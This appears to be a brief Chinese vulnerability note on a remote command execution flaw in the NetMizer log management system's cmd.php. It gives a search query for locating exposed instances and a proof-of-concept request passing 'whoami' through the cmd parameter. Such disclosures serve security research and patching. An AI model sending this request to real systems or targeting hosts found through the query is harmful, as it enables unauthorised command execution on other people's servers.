# NetMizer 日志管理系统 cmd.php 远程命令执行漏洞

## 漏洞描述

NetMizer 日志管理系统 cmd.php中存在远程命令执行漏洞，攻击者通过传入 cmd参数即可命令执行

## 漏洞影响

<a-checkbox checked>NetMizer 日志管理系统</a-checkbox></br>

## 网络测绘

<a-checkbox checked>title="NetMizer 日志管理系统"</a-checkbox></br>

## 漏洞复现

登录页面

![img](../../../.vuepress/public/img/1628834857867-6694d560-2345-49e8-9460-2296c316a7a3-20220314133236391.png)

验证POC

```python
/data/manage/cmd.php?cmd=whoami
```

![img](../../../.vuepress/public/img/1637918595617-0674c271-9040-4d74-acc4-1e0c1d71ab7c.png)



若有收获，就点个赞吧